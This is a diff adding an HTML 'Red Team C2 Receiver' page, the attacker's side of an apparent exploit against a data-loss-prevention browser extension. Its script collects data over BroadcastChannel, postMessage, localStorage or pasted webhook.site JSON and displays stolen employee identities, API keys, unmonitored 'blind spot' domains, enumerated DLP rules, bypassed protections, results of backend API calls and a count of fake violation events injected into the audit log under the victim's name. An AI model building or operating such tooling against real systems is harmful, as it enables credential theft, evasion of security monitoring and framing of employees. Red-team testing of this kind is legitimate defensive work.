@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Red Team C2 — Exfiltrated Data Receiver</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#080810;color:#d0d0d0;font-family:'SF Mono',Monaco,Consolas,monospace;padding:20px;font-size:12px}
+h1{color:#f34;font-size:18px;margin-bottom:4px}
+.sub{color:#666;font-size:11px;margin-bottom:16px}
+.status{padding:10px;border-radius:6px;margin-bottom:16px;font-size:13px}
+.waiting{background:#1a1a10;border:1px solid #fa03;color:#fa0}
+.received{background:#0a1a0a;border:1px solid #0f83;color:#0f8}
+.section{background:#10101a;border:1px solid #252535;border-radius:6px;padding:14px;margin-bottom:12px}
+.section h2{color:#f34;font-size:13px;margin-bottom:8px;text-transform:uppercase;letter-spacing:.5px}
+.kv{display:grid;grid-template-columns:180px 1fr;gap:2px 10px;font-size:11px;margin:3px 0}
+.kv .k{color:#666;text-align:right}.kv .v{color:#fa0;word-break:break-all}
+.sensitive .v{color:#f34;font-weight:bold}
+.tag{display:inline-block;padding:2px 8px;border-radius:3px;font-size:10px;font-weight:bold;margin:2px}
+.tag-ok{background:#0f82;color:#0f8}.tag-wr{background:#fa02;color:#fa0}.tag-bd{background:#f342;color:#f34}
+pre{background:#06060c;border:1px solid #181828;border-radius:4px;padding:10px;font-size:10px;overflow-x:auto;max-height:300px;overflow-y:auto;margin-top:8px;color:#888}
+.empty{color:#444;text-align:center;padding:40px;font-size:14px}
+.pulse{animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.btn{background:#f34;color:#fff;border:none;padding:6px 16px;border-radius:4px;font-size:12px;font-family:inherit;cursor:pointer;margin-right:8px}
+.btn:hover{background:#f56}
+.btn-sec{background:#252535;color:#aaa}.btn-sec:hover{background:#353545}
+</style>
+</head>
+<body>
+<h1>Red Team C2 Receiver</h1>
+<div class="sub">Open this page on YOUR machine. When the target visits the attack page, exfiltrated data appears here.</div>
+
+<div class="status waiting" id="status">
+  <span class="pulse">Waiting for exfiltrated data...</span><br>
+  <span style="font-size:11px;color:#888">
+    Using BroadcastChannel for same-origin or listening for postMessage from attack page.
+    If using webhook.site, paste the data below manually.
+  </span>
+</div>
+
+<div>
+  <button class="btn" onclick="document.getElementById('manual').style.display='block'">Paste Webhook Data</button>
+  <button class="btn btn-sec" onclick="clearData()">Clear</button>
+  <button class="btn btn-sec" onclick="exportJSON()">Export JSON</button>
+</div>
+
+<div id="manual" style="display:none;margin-top:10px">
+  <textarea id="paste" rows="6" style="width:100%;background:#06060c;border:1px solid #252535;color:#fa0;font-family:monospace;font-size:11px;padding:8px;border-radius:4px" placeholder="Paste the webhook.site request body JSON here..."></textarea>
+  <button class="btn" style="margin-top:6px" onclick="loadPasted()">Load Data</button>
+</div>
+
+<div id="output"><div class="empty">No data received yet</div></div>
+
+<script>
+let currentData = null;
+
+function renderData(D) {
+  currentData = D;
+  const out = document.getElementById('output');
+  const st = document.getElementById('status');
+  st.className = 'status received';
+  st.innerHTML = 'Data received at ' + new Date().toLocaleTimeString() + ' from ' + (D.pageUrl || 'unknown origin');
+
+  let html = '';
+
+  // Attack summary
+  html += '<div class="section"><h2>Attack Summary</h2>';
+  html += '<div class="kv"><div class="k">Attack Duration</div><div class="v">' + (D.attackDurationSec || '?') + 's</div></div>';
+  html += '<div class="kv"><div class="k">Functions Exploited</div><div class="v">' + (D.functionsUsed ? D.functionsUsed.length : '?') + '</div></div>';
+  html += '<div class="kv"><div class="k">Source Page</div><div class="v">' + (D.pageUrl || 'unknown') + '</div></div>';
+  html += '<div class="kv"><div class="k">Timestamp</div><div class="v">' + (D.timestamp || 'unknown') + '</div></div>';
+  if (D.functionsUsed) html += '<div class="kv"><div class="k">Functions</div><div class="v">' + D.functionsUsed.join(', ') + '</div></div>';
+  html += '</div>';
+
+  // Identity
+  if (D.identity) {
+    html += '<div class="section"><h2>Stolen: Employee Identity</h2>';
+    for (const [k, v] of Object.entries(D.identity)) {
+      if (v) html += '<div class="kv sensitive"><div class="k">' + k + '</div><div class="v">' + (typeof v === 'object' ? JSON.stringify(v) : v) + '</div></div>';
+    }
+    html += '</div>';
+  }
+
+  // API credentials
+  if (D.popupSettings) {
+    html += '<div class="section"><h2>Stolen: API Credentials</h2>';
+    for (const [k, v] of Object.entries(D.popupSettings)) {
+      const cls = (k === 'apiKey' || k === 'apiDomain') ? ' sensitive' : '';
+      html += '<div class="kv' + cls + '"><div class="k">' + k + '</div><div class="v">' + (v === undefined || v === null ? '(MDM-hidden)' : v) + '</div></div>';
+    }
+    html += '</div>';
+  }
+
+  // Site config
+  if (D.siteConfig) {
+    html += '<div class="section"><h2>Stolen: Site Action Config</h2>';
+    for (const [k, v] of Object.entries(D.siteConfig)) {
+      if (k !== 'userInfo' && v !== null && v !== undefined) {
+        html += '<div class="kv"><div class="k">' + k + '</div><div class="v">' + (typeof v === 'object' ? JSON.stringify(v).slice(0, 120) : v) + '</div></div>';
+      }
+    }
+    html += '</div>';
+  }
+
+  // Overlay
+  if (D.overlaySettings) {
+    html += '<div class="section"><h2>Stolen: Overlay Settings</h2>';
+    for (const [k, v] of Object.entries(D.overlaySettings)) {
+      if (v) html += '<div class="kv"><div class="k">' + k + '</div><div class="v">' + String(v).slice(0, 120) + '</div></div>';
+    }
+    html += '</div>';
+  }
+
+  // Coverage
+  if (D.monitored || D.unmonitored) {
+    html += '<div class="section"><h2>Stolen: Monitoring Coverage Map</h2>';
+    if (D.monitored && D.monitored.length) {
+      html += '<div style="margin-bottom:4px">';
+      for (const d of D.monitored) html += '<span class="tag tag-wr">' + d + '</span>';
+      html += '</div><div style="color:#888;font-size:10px">^ Monitored domains (' + D.monitored.length + ')</div>';
+    }
+    if (D.unmonitored && D.unmonitored.length) {
+      html += '<div style="margin:6px 0 4px">';
+      for (const d of D.unmonitored) html += '<span class="tag tag-bd">' + d + '</span>';
+      html += '</div><div style="color:#888;font-size:10px">^ BLIND SPOTS — unmonitored (' + D.unmonitored.length + ')</div>';
+    }
+    html += '</div>';
+  }
+
+  // DLP probes
+  if (D.probes && D.probes.length) {
+    html += '<div class="section"><h2>DLP Rule Enumeration (' + D.probes.length + ' payloads)</h2>';
+    for (const p of D.probes) {
+      const cls = p.status === 'BLOCKED' ? 'tag-bd' : p.status === 'MODIFIED' ? 'tag-wr' : 'tag-ok';
+      html += '<div style="margin:2px 0;font-size:11px"><span class="tag ' + cls + '">' + p.status + '</span> [' + p.category + '] ' + p.name;
+      if (p.input) html += ' <span style="color:#444">— "' + p.input.slice(0, 40) + '"</span>';
+      html += '</div>';
+    }
+    html += '</div>';
+  }
+
+  // Bypassed
+  if (D.bypassed && D.bypassed.length) {
+    html += '<div class="section"><h2>Protections Bypassed (24h)</h2>';
+    for (const d of D.bypassed) html += '<span class="tag tag-bd">' + d + '</span>';
+    html += '</div>';
+  }
+
+  // Poisoned events
+  if (D.poisons) {
+    html += '<div class="section"><h2>Audit Trail Poisoned (' + D.poisons + ' fake events)</h2>';
+    html += '<div style="color:#f34;font-size:11px">' + D.poisons + ' fabricated CRITICAL/HIGH DLP violation events injected into the extension\'s audit log, attributed to the victim employee.</div>';
+    html += '</div>';
+  }
+
+  // MCP results
+  if (D.mcpResults && D.mcpResults.length) {
+    html += '<div class="section"><h2>Backend API Exploitation (callMcpApi)</h2>';
+    for (const m of D.mcpResults) {
+      const cls = m.responded ? 'tag-bd' : 'tag-ok';
+      html += '<div style="margin:2px 0;font-size:11px"><span class="tag ' + cls + '">' + (m.responded ? 'RESPONSE' : 'TIMEOUT') + '</span> ' + m.api + ' — ' + m.desc + '</div>';
+    }
+    html += '</div>';
+  }
+
+  // Raw JSON
+  html += '<div class="section"><h2>Raw Exfiltrated JSON</h2>';
+  html += '<pre>' + JSON.stringify(D, null, 2) + '</pre>';
+  html += '</div>';
+
+  out.innerHTML = html;
+}
+
+function loadPasted() {
+  try {
+    const data = JSON.parse(document.getElementById('paste').value);
+    renderData(data);
+    document.getElementById('manual').style.display = 'none';
+  } catch (e) { alert('Invalid JSON: ' + e.message); }
+}
+
+function clearData() {
+  currentData = null;
+  document.getElementById('output').innerHTML = '<div class="empty">No data received yet</div>';
+  document.getElementById('status').className = 'status waiting';
+  document.getElementById('status').innerHTML = '<span class="pulse">Waiting for exfiltrated data...</span>';
+}
+
+function exportJSON() {
+  if (!currentData) return alert('No data to export');
+  const blob = new Blob([JSON.stringify(currentData, null, 2)], { type: 'application/json' });
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
+  a.download = 'exfiltrated_' + new Date().toISOString().replace(/[:.]/g, '-') + '.json';
+  a.click();
+}
+
+// Listen for cross-tab messages (if attack page sends via BroadcastChannel)
+try {
+  const bc = new BroadcastChannel('ps_exfil');
+  bc.onmessage = e => { if (e.data) renderData(e.data); };
+} catch (e) {}
+
+// Also listen for postMessage (if opened in popup from attack page)
+window.addEventListener('message', e => {
+  if (e.data && e.data.functionsUsed) renderData(e.data);
+});
+
+// Check localStorage on load and poll for new data
+function checkStorage() {
+  try {
+    const raw = localStorage.getItem('ps_exfil_data');
+    if (raw) { renderData(JSON.parse(raw)); }
+  } catch(e) {}
+}
+checkStorage();
+setInterval(checkStorage, 2000);
+</script>
+</body>
+</html>
